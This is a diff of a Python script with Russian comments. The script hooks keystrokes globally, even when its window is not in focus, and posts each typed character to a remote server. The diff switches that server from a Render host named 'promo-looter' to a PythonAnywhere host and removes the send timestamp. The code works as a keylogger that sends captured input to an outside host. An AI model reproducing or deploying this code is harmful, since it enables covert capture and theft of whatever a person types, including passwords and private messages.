@@ -3,17 +3,22 @@ import keyboard
 import threading
 import time
 
-SERVER_URL = "https://promo-looter.onrender.com"
+SERVER_PYTHON = "https://Baltezar.eu.pythonanywhere.com"
+
+SERVER_RENDER = "https://promo-looter.onrender.com"
+
+SERVER_URL = SERVER_PYTHON # бесплатный Render сервер
+
 char_count = 1 # кол-во символов которые будут обрабатываться для копирование в буфер обмена и отправка на сервер. Задается на моем сервере через cmd
 
 is_active = False # флаг чтобы включать и выключать скан символов без выключения скрипта
+
 
 # Метод отправки символа на сервер
 def send_char(char):
     try:
         requests.post(f"{SERVER_URL}/send", json={
-            "char": char,
-            "sent_at": time.time() # время отправки в секундах
+            "char": char
         })
         print(f"Отправлен символ: {char}")
     except Exception as e:
@@ -46,7 +51,6 @@ def on_key(event):
         return
     if len(event.name) == 1: # фильтруем служебные клавиши типы shift, ctrl, f1 - у них name длиннее одного символа
         send_char(event.name) # и отправляем нажатую клавишу в метод для отправки на сервер
-
 
 threading.Thread(target=ping_server, daemon=True).start()
 keyboard.on_press(on_key) # keyboard - слушает клавишы глобально, даже когда окно не в фокусе.
